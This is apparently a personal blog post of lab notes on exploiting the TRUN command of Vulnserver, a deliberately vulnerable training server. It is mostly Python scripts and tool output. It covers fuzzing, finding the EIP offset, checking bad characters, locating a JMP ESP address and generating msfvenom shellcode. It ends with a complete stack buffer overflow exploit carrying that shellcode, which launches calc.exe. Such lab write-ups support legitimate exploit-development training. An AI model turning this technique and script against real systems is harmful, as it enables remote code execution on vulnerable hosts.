---
title: "TRUN"
description: "Notes from the TRUN command on the Vulnserver machine."
date: 2020-03-06T13:32:54+01:00
draft: false
---

## Fuzzing

```python
#!/usr/bin/python

import socket,sys
from time import sleep

address = '192.168.136.130'
port    = 9999

offset  = 100

while True:
	try:
		buffer  = b""         # empty byte var
		buffer += b"A"*offset # junk times offset
		print(f'[+] Sending buffer: {str(len(buffer))} bytes')
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((address,port))
		s.recv(1024)			
		s.send(b"TRUN /.:/%s \r\n" % buffer) 
		offset += 100
		sleep(1)
	except RuntimeError as Err:
		print(f'[!] Unable to connect to the application. {err}')
		sys.exit(0)
	finally:
		s.close()
```

```bash
root@kali:/mnt/hgfs/_shared_folder/BO python3 trun_1.py 
[+] Sending buffer: 109 bytes
[+] Sending buffer: 209 bytes
[+] Sending buffer: 309 bytes
[+] Sending buffer: 409 bytes
[+] Sending buffer: 509 bytes
[+] Sending buffer: 609 bytes
[+] Sending buffer: 709 bytes
[+] Sending buffer: 809 bytes
[+] Sending buffer: 909 bytes
[+] Sending buffer: 1009 bytes
[+] Sending buffer: 1109 bytes
[+] Sending buffer: 1209 bytes
[+] Sending buffer: 1309 bytes
[+] Sending buffer: 1409 bytes
[+] Sending buffer: 1509 bytes
[+] Sending buffer: 1609 bytes
[+] Sending buffer: 1709 bytes
[+] Sending buffer: 1809 bytes
[+] Sending buffer: 1909 bytes
[+] Sending buffer: 2009 bytes
[+] Sending buffer: 2109 bytes
[!] Unable to connect to the application.
```

## Find EIP Offset

```
root@kali:/mnt/hgfs/_shared_folder/BO# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
```

```python
#!/usr/bin/python 

import socket,sys

address = '192.168.136.130'
port    = 9999

#offset  = around 2100

pattern = b"Aa0Aa1Aa...Cv0Cv1Cv2C"  # Snipped output of pattern_create.rb
buff    = b""              # empty byte var
buff    = b"%s" % pattern  # add pattern to buff

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b"TRUN /.:/%s" % buff) 
except RuntimeError as Err:
	print(f'[!] Unable to connect to the application. {err}')
	sys.exit(0)
finally:
	s.close()

```


EIP value: 386f4337 (8oC7)

```bash
root@kali:/mnt/hgfs/_shared_folder/BO /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 386f4337
[*] Exact match at offset 2003
```

### Controlling the ESP

```python
#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003 

buff  = b""         # empty byte var
buff += b'A'*offset # junk
buff += b'B'*4      # EIP
buff += b'C'*256    # some more junk on stack after EIP which we want to eventually store our shellcode and jump to.
buff += b'D'*256    # this also gives us an idea of how much space we have on the stack.
buff += b'E'*128    # 
buff += b'F'*128    # 
buff += b'G'*64     # 
buff += b'H'*64     # 
buff += b'I'*32     # 
buff += b'J'*32     # 

print(buff)

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b"TRUN /.:/%s" % buff) 
except RuntimeError as err:
	print(f'[!] Unable to connect to the application.')
	sys.exit(0)
finally:
	s.close()

```


## Finding Bad Characters

```python
#!/usr/bin/python 

import socket,sys

address = '192.168.136.130'
port    = 9999

command = b'TRUN /.:/'
offset  = 2003

bad_chars = [0x00]
chars = b""
for i in range(0x00,0xFF+1):
    if i not in bad_chars:
        chars += bytes([i])

buff  = b""         # empty byte var
buff += b"A"*offset # junk
buff += b"B"*4      # EIP
buff += b"" + chars # test for chars

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b"TRUN /.:/%s" % buff) 
except RuntimeError as err:
	print(f'[!] Unable to connect to the application. {err}')
	sys.exit(0)
finally:
	s.close()
```


no bad chars

## Find JMP ESP

`!mona modules`

essfunc.dll


```
root@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
nasm >
```

`!mona find -s "\xFF\xE4" -m essfunc.dll`


`625011af` 

```python
#!/usr/bin/python 

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

shellcode = b"C"*256

buff  = b""                 # empty byte var
buff += b"A"*offset         # junk
buff += b"\xAF\x11\x50\x62" # EIP to JMP ESP
buff += b'C'*256            # some more junk on stack after EIP which we want to eventually store our shellcode and jump to.
buff += b'D'*256            # this also gives us an idea of how much space we have on the stack.
buff += b'E'*128            # 
buff += b'F'*128            # 
buff += b'G'*64             # 
buff += b'H'*64             # 
buff += b'I'*32             # 
buff += b'J'*32             # 

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b"TRUN /.:/%s" % buff) 
except RuntimeError as err:
	print(f'[!] Unable to connect to the application. {err}')
	sys.exit(0)
finally:
	s.close()

```


## Generate Shellcode

```
root@kali:/mnt/hgfs/_shared_folder/BO# msfvenom -p windows/exec CMD=calc.exe -b '\x00\' -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of c file: 949 bytes
unsigned char buf[] = 
"\xbb\xbb\x2a\xfd\xc1\xdb\xd4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x31\x83\xed\xfc\x31\x5d\x0f\x03\x5d\xb4\xc8\x08\x3d\x22\x8e"
"\xf3\xbe\xb2\xef\x7a\x5b\x83\x2f\x18\x2f\xb3\x9f\x6a\x7d\x3f"
"\x6b\x3e\x96\xb4\x19\x97\x99\x7d\x97\xc1\x94\x7e\x84\x32\xb6"
"\xfc\xd7\x66\x18\x3d\x18\x7b\x59\x7a\x45\x76\x0b\xd3\x01\x25"
"\xbc\x50\x5f\xf6\x37\x2a\x71\x7e\xab\xfa\x70\xaf\x7a\x71\x2b"
"\x6f\x7c\x56\x47\x26\x66\xbb\x62\xf0\x1d\x0f\x18\x03\xf4\x5e"
"\xe1\xa8\x39\x6f\x10\xb0\x7e\x57\xcb\xc7\x76\xa4\x76\xd0\x4c"
"\xd7\xac\x55\x57\x7f\x26\xcd\xb3\x7e\xeb\x88\x30\x8c\x40\xde"
"\x1f\x90\x57\x33\x14\xac\xdc\xb2\xfb\x25\xa6\x90\xdf\x6e\x7c"
"\xb8\x46\xca\xd3\xc5\x99\xb5\x8c\x63\xd1\x5b\xd8\x19\xb8\x31"
"\x1f\xaf\xc6\x77\x1f\xaf\xc8\x27\x48\x9e\x43\xa8\x0f\x1f\x86"
"\x8d\xe0\x55\x8b\xa7\x68\x30\x59\xfa\xf4\xc3\xb7\x38\x01\x40"
"\x32\xc0\xf6\x58\x37\xc5\xb3\xde\xab\xb7\xac\x8a\xcb\x64\xcc"
"\x9e\xaf\xeb\x5e\x42\x1e\x8e\xe6\xe1\x5e";
```

```python
#!/usr/bin/python 

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

shellcode = b"\xbb\xbb\x2a\xfd\xc1\xdb\xd4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x31\x83\xed\xfc\x31\x5d\x0f\x03\x5d\xb4\xc8\x08\x3d\x22\x8e\xf3\xbe\xb2\xef\x7a\x5b\x83\x2f\x18\x2f\xb3\x9f\x6a\x7d\x3f\x6b\x3e\x96\xb4\x19\x97\x99\x7d\x97\xc1\x94\x7e\x84\x32\xb6\xfc\xd7\x66\x18\x3d\x18\x7b\x59\x7a\x45\x76\x0b\xd3\x01\x25\xbc\x50\x5f\xf6\x37\x2a\x71\x7e\xab\xfa\x70\xaf\x7a\x71\x2b\x6f\x7c\x56\x47\x26\x66\xbb\x62\xf0\x1d\x0f\x18\x03\xf4\x5e\xe1\xa8\x39\x6f\x10\xb0\x7e\x57\xcb\xc7\x76\xa4\x76\xd0\x4c\xd7\xac\x55\x57\x7f\x26\xcd\xb3\x7e\xeb\x88\x30\x8c\x40\xde\x1f\x90\x57\x33\x14\xac\xdc\xb2\xfb\x25\xa6\x90\xdf\x6e\x7c\xb8\x46\xca\xd3\xc5\x99\xb5\x8c\x63\xd1\x5b\xd8\x19\xb8\x31\x1f\xaf\xc6\x77\x1f\xaf\xc8\x27\x48\x9e\x43\xa8\x0f\x1f\x86\x8d\xe0\x55\x8b\xa7\x68\x30\x59\xfa\xf4\xc3\xb7\x38\x01\x40\x32\xc0\xf6\x58\x37\xc5\xb3\xde\xab\xb7\xac\x8a\xcb\x64\xcc\x9e\xaf\xeb\x5e\x42\x1e\x8e\xe6\xe1\x5e"

buff  = b""                 # empty byte var
buff += b"A"*offset         # junk
buff += b"\xAF\x11\x50\x62" # EIP to JMP ESP
buff += b"\x90"*32          # NOP sled
buff += b"%s" % shellcode   # add shellcode to buffer

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b"TRUN /.:/%s" % buff)
except RuntimeError as err:
	print(f'[!] Unable to connect to the application. {err}')
	sys.exit(0)
finally:
	s.close()
```

## Exploit
